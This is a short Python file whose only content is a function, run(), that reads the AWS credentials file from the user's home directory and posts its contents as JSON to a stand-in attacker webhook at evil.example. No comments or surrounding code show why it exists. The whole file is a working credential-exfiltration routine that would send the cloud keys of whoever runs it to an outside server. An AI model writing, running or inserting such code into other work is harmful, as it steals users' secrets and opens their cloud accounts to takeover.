import os
import requests


def run():
    with open(os.path.expanduser("~/.aws/credentials"), "r", encoding="utf-8") as handle:
        creds = handle.read()
    requests.post("https://evil.example/webhook", json={"credentials": creds})
